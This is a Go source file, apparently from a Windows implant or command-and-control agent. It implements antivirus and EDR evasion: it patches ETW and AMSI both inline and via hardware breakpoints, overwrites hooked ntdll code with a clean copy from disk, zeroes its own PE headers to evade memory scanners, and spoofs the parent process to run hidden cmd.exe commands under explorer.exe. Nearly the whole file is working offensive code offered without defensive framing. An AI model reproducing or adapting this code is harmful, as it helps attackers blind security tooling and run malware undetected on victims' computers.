//go:build windows

package main

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	pVirtualProtect  = kernel32.NewProc("VirtualProtect")
	pGetModuleHandle = kernel32.NewProc("GetModuleHandleW")
	pGetProcAddress  = kernel32.NewProc("GetProcAddress")
	pCreateFileW     = kernel32.NewProc("CreateFileW")
	pCreateFileMapping = kernel32.NewProc("CreateFileMappingW")
	pMapViewOfFile   = kernel32.NewProc("MapViewOfFile")
	pUnmapViewOfFile = kernel32.NewProc("UnmapViewOfFile")
	pCloseHandle     = kernel32.NewProc("CloseHandle")
	pOpenProcess     = kernel32.NewProc("OpenProcess")

	pCreateProcessW     = kernel32.NewProc("CreateProcessW")
	pInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
	pUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
	pDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")

	pNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
)

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
	FILE_MAP_READ          = 0x04
	GENERIC_READ           = 0x80000000
	FILE_SHARE_READ        = 0x01
	OPEN_EXISTING          = 3
	SEC_IMAGE              = 0x1000000
	PROCESS_ALL_ACCESS     = 0x001F0FFF
	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	CREATE_NO_WINDOW       = 0x08000000
)

func initWindowsEvasion() {
	unhookNtdll()
	initSyscallTable()
	patchETWHardware()
	patchAMSIHardware()
	initSleepEncryption()
}

// patchETWInline patches EtwEventWrite with inline xor eax,eax;ret.
// Simpler than hardware breakpoints; sufficient for Defender.
func patchETWInline() {
	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("ntdll.dll"))
	if mod == 0 {
		return
	}
	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWrite\x00")))
	if proc == 0 {
		return
	}
	var patch []byte
	if runtime.GOARCH == "amd64" {
		patch = []byte{0x33, 0xC0, 0xC3}
	} else {
		patch = []byte{0x33, 0xC0, 0xC2, 0x14, 0x00}
	}
	writeMemory(proc, patch)

	// Also patch EtwEventWriteEx
	procEx, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWriteEx\x00")))
	if procEx != 0 {
		writeMemory(procEx, patch)
	}
}

func patchETWHardware() {
	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("ntdll.dll"))
	if mod == 0 {
		return
	}
	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWrite\x00")))
	if proc == 0 {
		return
	}
	if setHardwareBreakpoint(proc, 0) {
		procEx, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("EtwEventWriteEx\x00")))
		if procEx != 0 {
			setHardwareBreakpoint(procEx, 1)
		}
		return
	}
	patchETWInline()
}

func patchAMSIHardware() {
	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("amsi.dll"))
	if mod == 0 {
		amsiDll, err := syscall.LoadDLL("amsi.dll")
		if err != nil {
			return
		}
		mod = uintptr(amsiDll.Handle)
	}
	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("AmsiScanBuffer\x00")))
	if proc == 0 {
		return
	}
	if setHardwareBreakpoint(proc, 2) {
		return
	}
	patchAMSI()
}

func setHardwareBreakpoint(addr uintptr, reg int) bool {
	retVal := uint64(0)
	if reg == 2 {
		retVal = 0x80070057
	}
	registerBreakpointHandler(addr, retVal)
	hwbpBreakpoints = append(hwbpBreakpoints, hwbpEntry{addr: addr, reg: reg, ret: retVal})
	return setBreakpointCurrentThread()
}

func setBreakpointCurrentThread() bool {
	pGetCurrentThread := kernel32.NewProc("GetCurrentThread")
	thread, _, _ := pGetCurrentThread.Call()
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL

	pGetCtx := ntdll.NewProc("NtGetContextThread")
	ret, _, _ := pGetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	if ret != 0 {
		return false
	}

	for _, bp := range hwbpBreakpoints {
		switch bp.reg {
		case 0:
			ctx.Dr0 = uint64(bp.addr)
		case 1:
			ctx.Dr1 = uint64(bp.addr)
		case 2:
			ctx.Dr2 = uint64(bp.addr)
		case 3:
			ctx.Dr3 = uint64(bp.addr)
		}
		ctx.Dr7 &^= uint64(3 << (bp.reg * 2))
		ctx.Dr7 |= uint64(1 << (bp.reg * 2))
		ctx.Dr7 &^= uint64(3 << (16 + bp.reg*4))
	}

	pSetCtx := ntdll.NewProc("NtSetContextThread")
	ret, _, _ = pSetCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	return ret == 0
}

func refreshHardwareBreakpoints() {
	if len(hwbpBreakpoints) > 0 {
		setBreakpointCurrentThread()
	}
}

var (
	hwbpTargets    = make(map[uintptr]uint64) // addr → return value
	hwbpVEHOnce    bool
	hwbpBreakpoints []hwbpEntry
)

type hwbpEntry struct {
	addr uintptr
	reg  int
	ret  uint64
}

func registerBreakpointHandler(addr uintptr, retVal uint64) {
	hwbpTargets[addr] = retVal
	if !hwbpVEHOnce {
		hwbpVEHOnce = true
		pAddVectoredExceptionHandler := kernel32.NewProc("AddVectoredExceptionHandler")
		pAddVectoredExceptionHandler.Call(1, syscall.NewCallback(hwbpHandler))
	}
}

func hwbpHandler(info *EXCEPTION_POINTERS) uintptr {
	if info == nil || info.ExceptionRecord == nil || info.ContextRecord == nil {
		return 0
	}
	if info.ExceptionRecord.ExceptionCode != EXCEPTION_SINGLE_STEP {
		return 0
	}
	rip := uintptr(info.ContextRecord.Rip)
	if retVal, ok := hwbpTargets[rip]; ok {
		info.ContextRecord.Rax = retVal
		rsp := uintptr(info.ContextRecord.Rsp)
		retAddr := *(*uintptr)(unsafe.Pointer(rsp))
		info.ContextRecord.Rip = uint64(retAddr)
		info.ContextRecord.Rsp += 8
		return 0xFFFFFFFF
	}
	return 0
}

// CONTEXT for amd64 — debug registers
type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

type EXCEPTION_RECORD struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *EXCEPTION_RECORD
	ExceptionAddress uintptr
	NumberParameters uint32
	_pad             uint32
	ExceptionInformation [15]uintptr
}

type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT
}

const (
	EXCEPTION_SINGLE_STEP       = 0x80000004
	CONTEXT_DEBUG_REGISTERS     = 0x00100010
	CONTEXT_FULL                = 0x0010001F
)

// stompPEHeader zeros out our own DOS and NT headers in memory.
// This prevents memory scanners from identifying our PE structure.
func stompPEHeader() {
	mod, _, _ := pGetModuleHandle.Call(0)
	if mod == 0 {
		return
	}

	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(mod))
	headerSize := uintptr(dosHeader.E_lfanew) + 264 // NT headers + some optional header

	var oldProtect uint32
	pVirtualProtect.Call(mod, headerSize, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))

	// Zero out the headers
	mem := unsafe.Slice((*byte)(unsafe.Pointer(mod)), headerSize)
	for i := range mem {
		mem[i] = 0
	}

	pVirtualProtect.Call(mod, headerSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// patchAMSI patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
// This prevents Defender from scanning in-memory content from child processes.
func patchAMSI() {
	mod, _, _ := pGetModuleHandle.Call(uintptrFromString("amsi.dll"))
	if mod == 0 {
		// AMSI not loaded yet — load it so we can patch before anything uses it
		amsiDll, err := syscall.LoadDLL("amsi.dll")
		if err != nil {
			return
		}
		mod = uintptr(amsiDll.Handle)
	}
	proc, _, _ := pGetProcAddress.Call(mod, uintptrFromBytes([]byte("AmsiScanBuffer\x00")))
	if proc == 0 {
		return
	}

	var patch []byte
	if runtime.GOARCH == "amd64" {
		// mov eax, 0x80070057 (E_INVALIDARG); ret
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	} else {
		// mov eax, 0x80070057; ret 18h
		patch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00}
	}

	writeMemory(proc, patch)
}

// unhookNtdll remaps a clean copy of ntdll.dll from disk over the hooked
// in-memory copy. This removes any inline hooks placed by Defender/EDR.
func unhookNtdll() {
	sysroot := os.Getenv("SYSTEMROOT")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	ntdllPath := sysroot + `\System32\ntdll.dll`

	pathW, _ := syscall.UTF16PtrFromString(ntdllPath)
	hFile, _, _ := pCreateFileW.Call(
		uintptr(unsafe.Pointer(pathW)),
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0, 0,
	)
	if hFile == uintptr(^uintptr(0)) {
		return
	}
	defer pCloseHandle.Call(hFile)

	hMapping, _, _ := pCreateFileMapping.Call(hFile, 0, SEC_IMAGE|syscall.PAGE_READONLY, 0, 0, 0)
	if hMapping == 0 {
		return
	}
	defer pCloseHandle.Call(hMapping)

	cleanCopy, _, _ := pMapViewOfFile.Call(hMapping, FILE_MAP_READ, 0, 0, 0)
	if cleanCopy == 0 {
		return
	}
	defer pUnmapViewOfFile.Call(cleanCopy)

	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hookedBase, _, _ := pGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
	if hookedBase == 0 {
		return
	}

	// Parse PE to find .text section and overwrite it
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hookedBase))
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hookedBase + uintptr(dosHeader.E_lfanew)))

	sectionOffset := uintptr(unsafe.Sizeof(*ntHeaders))
	if runtime.GOARCH == "amd64" {
		sectionOffset = uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
	} else {
		sectionOffset = uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
	}

	for i := uint16(0); i < ntHeaders.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hookedBase + sectionOffset + uintptr(i)*40))
		name := sectionName(section)

		if name == ".text" {
			var oldProtect uint32
			addr := hookedBase + uintptr(section.VirtualAddress)
			size := uintptr(section.VirtualSize)

			pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))

			cleanText := unsafe.Pointer(cleanCopy + uintptr(section.VirtualAddress))
			copy(
				unsafe.Slice((*byte)(unsafe.Pointer(addr)), size),
				unsafe.Slice((*byte)(cleanText), size),
			)

			pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
			break
		}
	}
}

// PE structures for parsing ntdll headers
type IMAGE_DOS_HEADER struct {
	E_magic  uint16
	_pad     [28]uint16
	E_lfanew int32
}

type IMAGE_NT_HEADERS struct {
	Signature          uint32
	Machine            uint16
	NumberOfSections   uint16
	TimeDateStamp      uint32
	PointerToSymbolTable uint32
	NumberOfSymbols    uint32
	OptionalHeaderSize uint16
	Characteristics    uint16
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

func sectionName(s *IMAGE_SECTION_HEADER) string {
	n := string(s.Name[:])
	if idx := strings.IndexByte(n, 0); idx >= 0 {
		n = n[:idx]
	}
	return n
}

// writeMemory changes page protection, writes bytes, and restores protection.
func writeMemory(addr uintptr, data []byte) {
	var oldProtect uint32
	size := uintptr(len(data))
	pVirtualProtect.Call(addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)
	pVirtualProtect.Call(addr, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func uintptrFromString(s string) uintptr {
	p, _ := syscall.UTF16PtrFromString(s)
	return uintptr(unsafe.Pointer(p))
}

func uintptrFromBytes(b []byte) uintptr {
	return uintptr(unsafe.Pointer(&b[0]))
}

// ExecuteWithPPIDSpoof runs a command as a child of the specified parent PID.
// This breaks the suspicious agent→cmd.exe parent-child chain that EDRs flag.
func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
	hParent, _, err := pOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(parentPID))
	if hParent == 0 {
		return nil, fmt.Errorf("OpenProcess: %v", err)
	}
	defer pCloseHandle.Call(hParent)

	// Initialize thread attribute list
	var attrListSize uintptr
	pInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
	attrList := make([]byte, attrListSize)
	attrListPtr := unsafe.Pointer(&attrList[0])

	ret, _, err := pInitializeProcThreadAttributeList.Call(
		uintptr(attrListPtr), 1, 0, uintptr(unsafe.Pointer(&attrListSize)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList: %v", err)
	}
	defer pDeleteProcThreadAttributeList.Call(uintptr(attrListPtr))

	ret, _, err = pUpdateProcThreadAttribute.Call(
		uintptr(attrListPtr), 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&hParent)), unsafe.Sizeof(hParent),
		0, 0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("UpdateProcThreadAttribute: %v", err)
	}

	// Create pipe for stdout
	var readPipe, writePipe syscall.Handle
	sa := syscall.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
		InheritHandle:     1,
	}
	if err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(readPipe)

	cmdLine, _ := syscall.UTF16PtrFromString("cmd.exe /C " + command)

	type STARTUPINFOEX struct {
		syscall.StartupInfo
		AttributeList unsafe.Pointer
	}

	si := STARTUPINFOEX{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = syscall.STARTF_USESTDHANDLES
	si.StdOutput = writePipe
	si.StdErr = writePipe
	si.AttributeList = attrListPtr

	var pi syscall.ProcessInformation
	ret, _, err = pCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 1,
		EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		syscall.CloseHandle(writePipe)
		return nil, fmt.Errorf("CreateProcessW: %v", err)
	}

	syscall.CloseHandle(writePipe)
	syscall.CloseHandle(pi.Thread)

	// Read output
	var output []byte
	buf := make([]byte, 4096)
	for {
		var n uint32
		err := syscall.ReadFile(readPipe, buf, &n, nil)
		if err != nil || n == 0 {
			break
		}
		output = append(output, buf[:n]...)
	}

	syscall.WaitForSingleObject(pi.Process, 30000)
	syscall.CloseHandle(pi.Process)

	return output, nil
}

// findExplorerPID returns the PID of explorer.exe for parent spoofing.
func findExplorerPID() uint32 {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer syscall.CloseHandle(snapshot)

	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = syscall.Process32First(snapshot, &pe)
	for err == nil {
		name := syscall.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(name, "explorer.exe") {
			return pe.ProcessID
		}
		err = syscall.Process32Next(snapshot, &pe)
	}
	return 0
}
